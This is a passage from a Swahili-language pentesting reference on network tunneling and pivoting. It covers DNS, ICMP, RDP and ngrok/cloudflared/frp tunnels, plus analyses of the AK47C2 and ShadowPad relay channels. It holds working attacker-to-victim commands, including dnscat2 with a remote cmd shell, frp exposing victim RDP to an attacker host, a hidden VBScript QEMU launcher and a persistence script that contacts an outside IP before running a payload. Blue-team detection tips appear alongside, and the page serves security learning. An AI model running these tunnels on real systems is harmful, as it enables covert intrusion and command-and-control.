Sheria hii ni ya kudumu, kwa hivyo ionyeshe kwa kutumia `netsh interface portproxy show v4tov4` na uiondoe waziwazi baada ya majaribio. Kumbuka kuwa `portproxy` hufanya forwarding pekee; firewall ya host lazima pia iruhusu port inayosikilizwa.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP kwenye mfumo**.\
Pakua:

SocksOverRDP hutumia Remote Desktop Dynamic Virtual Channels kubeba muunganisho wa SOCKS5 kupitia session iliyopo ya RDP; plugin ya client husikiliza kwenye `127.0.0.1:1080` huku component ya server ikiendeshwa kwenye target ya RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) za kipengele cha Remote Desktop Service cha Windows. DVC inahusika na **kutunnel pakiti kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** hivi:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Sasa tunaweza **kuunganisha** na **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **ujumbe** unaosema kuwa **plugin ya SocksOverRDP imewashwa**, na itasikiliza kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP**, kisha pakia na utekeleze binary ya `SocksOverRDP-Server.exe` kwenye mashine ya victim:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 iko katika hali ya kusikiliza:

```
netstat -antb | findstr 1080
```

Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) kuelekeza traffic kupitia port hiyo.<sup>[[26]](#references)</sup>

### Utafutaji wa RDP virtual-channel

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) ni tunnel nyingine ya RDP virtual-channel; jina lake chaguomsingi la channel ni `rdp2tcp`, ingawa operator anaweza kuchagua jina tofauti.<sup>[[56]](#references)</sup> Uundaji na ufungaji wa channel hurekodiwa katika `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` kama event IDs **132** na **148**. Tafuta `rdp2tcp` na majina ya channel adimu/ya nasibu, kisha yalinganishe na channel zinazotarajiwa kama vile `XPSRD`, `cliprdr`, na `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Kuelekeza Programu za GUI za Windows kupitia Proxifier

Unaweza kusanidi programu za GUI za Windows zitumie proxy wakati wa kuvinjari kwa kutumia [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya SOCKS server.\
Katika **Profile -> Proxification Rules**, ongeza jina la programu ya kuelekeza kupitia proxy na miunganisho ya IP unazotaka kuelekeza kupitia proxy; sheria za Proxifier zinaweza kulinganisha programu, host lengwa na port.<sup>[[27]](#references)</sup>

## Kuelekeza tunnel kupitia NTLM proxy

Zana iliyotajwa awali, **Rpivot**, inaweza kuelekeza traffic kupitia proxy inayothibitisha kwa NTLM. **OpenVPN** pia inaweza kuelekeza traffic kupitia proxy hiyo ikisanidiwa kwa auth file na mbinu ya NTLMv2; huu ni upitishaji kupitia proxy, si njia ya kukwepa uthibitishaji wa proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm huthibitisha utambulisho kwa proxies za upstream za NTLM, hufungua listeners za ndani, na inaweza kuelekeza port ya tunnel ya ndani kwenye huduma lengwa; kisha wateja wanaweza kutumia port hiyo ya ndani.<sup>[[29]](#references)</sup>\
Kwa mfano, kuelekeza port 443 hiyo.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Sasa, ukiweka kwa mfano huduma ya **SSH** kwenye mwathiriwa isikilize kwenye port 443, unaweza kuiunganisha kupitia port 2222 ya mshambuliaji.<sup>[[29]](#references)</sup>\
Unaweza pia kutumia **meterpreter** inayounganisha kwenye localhost:443 huku mshambuliaji akisikiliza kwenye port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ni toolkit ya reverse-proxy ya .NET ya Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine huunda tunnel ya IPv4 kupitia maombi ya DNS na hutumia interfaces za TUN; usanidi ulioandikwa unahitaji haki zinazohitajika ili kuunda interfaces hizo kwenye ncha zote mbili.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport ina overhead kubwa kuliko TCP ya moja kwa moja na kwa kawaida huwa polepole; unaweza kuunda muunganisho wa SSH uliobanwa kupitia handaki hili kwa kutumia:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Pakua hapa**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 huanzisha njia iliyosimbwa ya command-and-control kupitia DNS; amri za server na client zilizo hapa chini zinafuata matumizi yaliyoelezwa kwenye nyaraka zake.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 katika PowerShell; README yake inaeleza vigezo vya `Start-Dnscat2` vilivyoonyeshwa hapa chini.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding kwa dnscat**

Amri ya `listen` ya dnscat2 huunganisha listener ya ndani na hosti na porti ya mbali.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Badilisha DNS ya proxychains

Proxychains-ng huunganisha hooks kwenye miunganisho ya TCP iliyounganishwa dynamically na haiwezi kupitisha UDP au ICMP; uelekezaji wa DNS kupitia proxy unaweza kusanidiwa, kwa hiyo kagua `proxychains.conf` iliyosakinishwa na helper ya resolver badala ya kudhani kuna resolver ya umma isiyobadilika. Script za zamani za `proxyresolv` hutoa `PROXY_DNS_SERVER` ili kuchagua resolver; tumia resolver inayoweza kufikiwa kutoka kwenye pivot wakati majina ya ndani yanahitajika.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Mhusika Storm-2603 aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya trafiki ya **DNS** inayotoka na **plain HTTP POST** pekee—protokali mbili ambazo hazizuiwi mara nyingi kwenye mitandao ya kampuni.<sup>[[2]](#references)</sup>

1. **Hali ya DNS (AK47DNS)**
   • Hutengeneza SessionID ya nasibu yenye vibambo 5 (k.m. `H4T14`).  
   • Huongeza `1` mwanzoni kwa *maombi ya kazi* au `2` kwa *matokeo*, kisha huunganisha sehemu tofauti (flags, SessionID, jina la kompyuta).  
   • Kila sehemu **husimbwa kwa XOR kwa kutumia ufunguo wa ASCII `VHBD@H`**, hubadilishwa kuwa hex, na kuunganishwa kwa nukta—kisha huishia na domain inayodhibitiwa na mshambulizi:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests hutumia `DnsQuery()` kwa rekodi za **TXT** (na **MG** kama mbadala).  
   • Jibu linapozidi baiti 0xFF, backdoor hugawanya data katika vipande vya baiti 63 na kuingiza alama:
     `s<SessionID>t<TOTAL>p<POS>` ili seva ya C2 iweze kuviweka upya kwa mpangilio sahihi.

2. **HTTP mode (AK47HTTP)**
   • Huunda bahasha ya JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Blob yote inawekwa XOR-`VHBD@H` → hex → na kutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
   • Jibu hutumia encoding hiyo hiyo, na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Vidokezo vya Blue Team
• Tafuta **TXT queries** zisizo za kawaida ambazo label yake ya kwanza ni hexadecimal ndefu na huishia kila mara kwenye domain moja adimu.  
• XOR key isiyobadilika ikifuatiwa na ASCII-hex ni rahisi kutambua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).  
• Kwa HTTP, weka alama kwenye POST bodies za text/plain ambazo zina hex pekee na idadi ya bytes inayogawanyika kwa mbili.

{{#note}}
Channel huweka kila sub-domain label ndani ya kikomo cha DNS cha octet 63, lakini kufuata tu masharti ya protocol hakufanyi iwe fiche; domains adimu, labels ndefu za hexadecimal na wingi wa queries bado ni ishara za kutambuliwa.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans inaeleza tunnel ya IPv4-over-ICMP inayotumia kifaa cha TUN na ICMP echo requests; usanidi unahitaji ruhusa za kutosha kuunda interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Pakua hapa**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng husafirisha miunganisho ya TCP kupitia ICMP na hutumia chaguo za `-p`, `-l`, `-r`, na `-R` zilizoonyeshwa hapa chini kwa proxy, msikilizaji wa ndani, hosti lengwa, na porti lengwa.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) ni wakala wa kuweka huduma za mtandao za ndani hewani kupitia handaki salama; CLI yake inaeleza endpoints za HTTP, TCP, na URL za faili, na hostname ya endpoint inayoonyeshwa inaweza kutofautiana kulingana na endpoint na akaunti.<sup>[[39]](#references)</sup>

### Usakinishaji

- Fungua akaunti: https://ngrok.com/signup
- Pakua client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Agent pia hutumia chaguo za authentication na TLS inapohitajika.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Kuweka faili wazi kupitia HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Kunasa maombi ya HTTP

_Inafaa kwa XSS,SSRF,SSTI ..._\
Agent inayojitegemea hutoa kiolesura chake cha ukaguzi wa HTTP kwenye `http://127.0.0.1:4040` kwa chaguo-msingi; kiolesura hiki ni cha trafiki ya HTTP.<sup>[[40]](#references)</sup>

#### Tunneling huduma ya ndani ya HTTP

Chaguo la `--host-header=rewrite` huandika upya header ya `Host` ya upstream ili ilingane na huduma ya ndani.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### mfano rahisi wa usanidi wa ngrok.yaml

Hii hutumia ngrok Agent Config v2; named tunnels hutumia `proto` na `addr` na huanzishwa kwa `ngrok start`.<sup>[[42]](#references)</sup> Hufungua tunnels 3:

- 2 TCP
- 1 HTTP yenye uwasilishaji wa static files kutoka /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels inaweza kuchapisha huduma ya ndani inayotumia TCP kupitia miundombinu ya relay ya Microsoft. CLI ya host huunda tunnel inayotoka nje, huku `devtunnel connect` ikiunda upya port iliyowekwa kwenye host kwenye client; kwa chaguomsingi, tunnel zinahitaji uthibitishaji isipokuwa vidhibiti vya ufikiaji vililegezwavyo kimakusudi.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Hii inaweza kufichua RDP kupitia `*.devtunnels.ms` bila kufungua listener mpya ya inbound kwenye perimeter. Inaweza pia kuunganishwa na RDP virtual-channel tunnel kama `rdp2tcp`, na kubadilisha kikao cha RDP kuwa pivot ya hatua ya pili kwa trafiki ya TCP ya aina yoyote.<sup>[[58]](#references)</sup>

Kwa hunting, linganisha utekelezaji wa Dev Tunnels CLI na trafiki ya DNS/TLS kwenda `*.devtunnels.ms` pamoja na matukio yasiyotarajiwa ya RDP virtual-channel. Tunnel iliyothibitishwa si salama kwa sababu tu inatumia relay inayomilikiwa na Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Kiunganishi cha Cloudflare Tunnel, `cloudflared`, huanzisha miunganisho ya outbound; programu zilizochapishwa zinaweza kuelekeza HTTP, HTTPS, TCP, SSH na RDP, huku quick tunnels zikikusudiwa kwa uendelezaji wa HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### origin ya SOCKS5 (hali ya legacy)

Flag ya legacy `--socks5` huiambia `cloudflared` kwamba origin ya ndani hutumia SOCKS5; haifungui listener ya ndani ya SOCKS5. Kwa managed tunnel, `originRequest.proxyType: socks` husanidi ushughulikiaji wa origin ya SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnels zinazoendelea kupitia DNS

Usanidi wa tunnel inayodhibitiwa ndani ya mfumo hutumia keys `tunnel`, `credentials-file`, na `url` zenye herufi ndogo, kama inavyoonyeshwa hapa chini.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Anzisha kiunganishi:

```bash
cloudflared tunnel run mytunnel
```

Kiunganishi huanzisha miunganisho ya nje na, kwa chaguo-msingi, hujadiliana kutumia QUIC, huku kikibadilisha hadi HTTP/2 ikiwa QUIC haipatikani; usidhani kuwa kila deployment hutumia TCP/443. Kiendeshe kwa ruhusa zinazohitajika tu na deployment yako.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse proxy ya Go inayotumia **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, na XTCP**. XTCP hutumia P2P hole punching, ambayo mafanikio yake hutegemea NAT. Kuanzia **v0.53.0**, inaweza kufanya kazi kama **SSH Tunnel Gateway**, ili host lengwa iweze kutumia client ya kawaida ya OpenSSH bila binary ya `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Handaki ya kawaida ya reverse TCP

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Kutumia SSH gateway mpya (bila binary ya frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Amri iliyo hapo juu huchapisha port ya mwathiriwa **8080** kama **attacker_ip:9000** kwa kutumia OpenSSH client ya kawaida, huku `frps` ikitoa gateway.<sup>[[50]](#references)</sup>

## Miunganisho ya kurudi ya UDP inayosaidiwa na STUN

STUN Binding requests zinazotumwa kutoka kwenye UDP socket zinaweza kufichua anwani yake ya IP na port zinazoonekana kwa seva, huku trafiki ya mara kwa mara ikiendeleza uhai wa NAT binding. Seva ya umma ya STUN si relay ya control packets za kiholela.<sup>[[60]](#references)</sup> Muundo wa back-connect uliochanganuliwa ulihifadhi UDP socket ileile kwa datagram fupi ya udhibiti, kisha ukatumia *muunganisho tofauti wa TCP unaotoka* kupakua na kutekeleza amri baada ya kichocheo kupokelewa.<sup>[[59]](#references)</sup>

Ili kupokea UDP packet ya controller, muundo bado unahitaji kushiriki mapping na controller huyo na kutimiza sera ya uchujaji ya NAT. Uchujaji unaotegemea anwani au port unaweza kukubali majibu kutoka kwa seva ya STUN lakini ukadondosha packets kutoka endpoint nyingine.<sup>[[60]](#references)[[61]](#references)</sup> Njia ya rendezvous ya backdoor iliyochanganuliwa haikuthibitishwa, kwa hiyo majibu ya STUN yaliyofanikiwa pekee hayathibitishi kwamba control channel yake inaweza kufikiwa.<sup>[[59]](#references)</sup> Kwa itifaki tofauti yenye rendezvous iliyo wazi na fallback ya relay, angalia [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Tunnels fiche zinazotumia VM kwa QEMU

QEMU user-mode networking haihitaji root au ruhusa za msimamizi kwa mtandao pepe, na `-netdev user,hostfwd=...` huelekeza TCP, UDP, au UNIX connections kutoka kwa host hadi kwa guest.<sup>[[51]](#references)</sup> TrustedSec iliandika kuhusu Tiny Core QEMU VM na jaribio la reverse SSH tunnel katika tukio ambapo EDR inayolenga host inaweza kukosa shughuli ndani ya guest.<sup>[[1]](#references)</sup>

### Amri fupi ya mstari mmoja

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Amri iliyo hapo juu huwasha guest ya **Tiny Core Linux** yenye MiB 256 za kumbukumbu ya guest na image ya diski ya qcow2; image ya diski si diski ya RAM.
• Port **2222/tcp** kwenye Windows host inapelekwa kwa uwazi hadi **22/tcp** ndani ya guest.
• Kwa mtazamo wa mshambuliaji, target huonyesha port 2222 pekee; pakiti zozote zinazoifikia hushughulikiwa na SSH server inayoendeshwa ndani ya VM.

### Kuwasha kwa kujificha kupitia VBScript

TrustedSec iliona uendeshaji wa QEMU unaoanzishwa na VBS na image za Tiny Core katika tukio lililotajwa hapo juu.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Kuendesha script kwa `cscript.exe //B update.vbs` huficha dirisha.<sup>[[1]](#references)</sup>

### Persistence ndani ya guest

Tukio lililotajwa linaeleza persistence katika guest ya Tiny Core isiyo na hali kupitia `/opt/bootlocal.sh` na `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Weka payload kwenye `/opt/123.out`  
2. Ongeza kwenye `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ijumuishwe kwenye `mydata.tgz` wakati wa kuzima.

### Mazingatio ya telemetry

• Host bado huonyesha mchakato wa QEMU, picha ya qcow2, na listener yoyote iliyoforwardiwa na host.  
• Uchunguzi wa michakato unaofanywa kwenye host pekee huenda usikague michakato ya guest, lakini virtualization haihakikishi ukwepaji; telemetry ya mtandao, QEMU na picha bado inaweza kuufichua.<sup>[[1]](#references)[[51]](#references)</sup>

### Vidokezo kwa watetezi

• Toa tahadhari kuhusu **binaries zisizotarajiwa za QEMU/VirtualBox/KVM** katika njia ambazo watumiaji wanaweza kuandika.  
• Zuia miunganisho ya kutoka nje inayoanzishwa na `qemu-system*.exe`.  
• Tafuta ports nadra za kusikiliza (2222, 10022, …) zinazofunguliwa mara tu baada ya QEMU kuzinduliwa.

## Relay nodes za IIS/HTTP.sys kupitia `HttpAddUrl` (ShadowPad)

Check Point inaeleza moduli ya IIS ya ShadowPad kuwa inageuza seva za wavuti za pembezoni zilizoathiriwa kuwa backdoor na relay nodes kwa kufunga viambishi awali vya URL kupitia `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ripoti hiyo hiyo inafafanua mipangilio chaguomsingi, listeners za wildcard, usimbuaji wa pakiti, foleni za relay na telemetry ya utatuzi iliyoelezwa hapa chini.<sup>[[3]](#references)</sup>

* **Mipangilio chaguomsingi** – ikiwa usanidi wa JSON wa moduli haujumuishi thamani, moduli hutumia mipangilio ya IIS inayoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Hivyo, IIS hujibu trafiki isiyo hasidi kwa utambulisho sahihi.
* **Ukamataji wa wildcard** – waendeshaji hutoa orodha ya viambishi awali vya URL vilivyotenganishwa kwa semikoloni (wildcards katika host + path). Moduli huita `HttpAddUrl` kwa kila ingizo, kwa hiyo HTTP.sys huelekeza maombi yanayolingana kwa handler hasidi; maombi yasiyolingana hutumia tena tabia ya kawaida ya IIS.
* **Pakiti ya kwanza iliyosimbwa** – baiti mbili za kwanza za mwili wa ombi hubeba seed ya PRNG maalum ya biti 32. Kila baiti inayofuata hu-XOR-iwa na keystream inayozalishwa kabla ya uchanganuzi wa protocol:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Uratibu wa Relay** – moduli hudumisha orodha mbili: “servers” (nodi za upstream) na “clients” (implants za downstream). Vipengee huondolewa ikiwa hakuna heartbeat inayopokelewa ndani ya takriban sekunde 30. Orodha zote mbili zinapokuwa na vipengee, moduli huoanisha server ya kwanza iliyo hai na client ya kwanza iliyo hai, kisha hupitisha tu bytes kati ya sockets zao hadi upande mmoja ufunge muunganisho.
* **Telemetry ya utatuzi** – logging ya hiari huhifadhi IP ya chanzo, IP ya lengwa, na jumla ya bytes zilizopitishwa kwa kila uoanishaji. Wachunguzi walitumia alama hizo kujenga upya mtandao wa ShadowPad uliosambaa kwa wahasiriwa wengi.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Kujificha Kwenye Vivuli: Tunnels Fiche kupitia QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Storm-2603 za Ransomware](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni Fiche ya Kukera Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Mwongozo wa Marejeo wa Nmap: Kukwepa Vizuizi vya Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Mwongozo wa OpenBSD ssh](https://man.openbsd.org/ssh)
- [7] [Mwongozo wa OpenBSD sshd_config](https://man.openbsd.org/sshd_config)
- [8] [Maelezo ya toleo la OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting katika Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Nyaraka za moduli ya Metasploit socks_proxy](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Nyaraka za moduli ya Metasploit autoroute](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Mwongozo wa Kuanzia Haraka wa Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners za Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost ya Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Mwongozo wa socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Mwongozo wa PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Chaguo za mstari wa amri za PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Amri ya Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Nyaraka za Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Sheria za Proxification za Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Mwongozo wa OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Majina ya Domain – Utekelezaji na Ufafanuzi](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI ya ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Kiolesura cha Ukaguzi wa Wavuti cha ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual hosts za ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Usanidi wa ngrok Agent v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Muhtasari wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Vigezo vya origin vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
